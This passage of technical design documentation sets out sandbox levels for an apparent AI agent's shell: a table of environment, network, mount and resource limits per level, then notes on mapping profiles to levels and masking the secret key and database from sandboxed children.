| env | inherit + scrub | clean allowlist | clean allowlist |
| network | proxy | proxy | none |
| CWD mount | rw | no | no |
| workspace | rw | rw | ro |
| RLIMIT_NPROC | none | 64 | 8 |
| RLIMIT_AS | none | 512MB | 128MB |
| RLIMIT_CPU | none | 60s | 10s |

- `bootstrap` maps to `trusted`
- `secret_agent` (future) maps to `trusted` with additional restriction: only `secret_store_write` tool, no shell
- Unknown values map to `standard`
- Resolved once in `agent_setup_init()`, stored in `ShellConfig`
- **`.cclaw_key` and the DB family are bind-masked** inside every sandboxed child, so even the CWD-mounting levels (`trusted`/`bootstrap`) can't read the secret key or DB ciphertext. Only `host` (no sandbox) is exposed. See [Secret Storage](#secret-storage).
